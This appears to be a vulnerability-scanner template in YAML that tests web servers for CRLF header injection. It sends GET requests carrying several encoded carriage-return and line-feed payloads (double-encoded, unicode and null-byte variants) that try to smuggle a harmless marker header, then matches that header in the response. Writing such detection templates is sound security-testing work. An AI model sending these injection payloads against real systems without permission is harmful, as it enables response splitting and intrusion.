id: crlf-custom-header-injection

info:
  name: CRLF Header Injection - Strict testtheader:testt.js
  author: grok
  severity: high
  description: Detects real CRLF injection creating new clean header "testtheader:testt.js". Avoids matches inside reflected Location/paths.
  tags: crlf,header-injection

http:
  - method: GET
    path:
      - "{{BaseURL}}//{{payload}}.js"
      - "{{BaseURL}}/{{payload}}.js"
      - "{{BaseURL}}/\\{{payload}}.js"
      - "{{BaseURL}}\\{{payload}}.js"

    payloads:
      payload:
        - testt%0d%0atesttheader:testt
        - testt%0atesttheader:testt
        - testt%0dtesttheader:testt
        - testt%250d%250atesttheader:testt
        - testt%E5%98%8Atesttheader:testt
        - testt%E5%98%8Dtesttheader:testt
        - testt%E5%98%8D%E5%98%8Atesttheader:testt
        - testt%09testtheader:testt
        - testt%00%0d%0atesttheader:testt

    stop-at-first-match: true
    matchers-condition: and

    matchers:
      # Strict matcher: Only matches if "testtheader" appears as a real header name at start of line
      - type: regex
        part: header
        regex:
          - "(?i)^testtheader\\s*:\\s*testt\\.js"
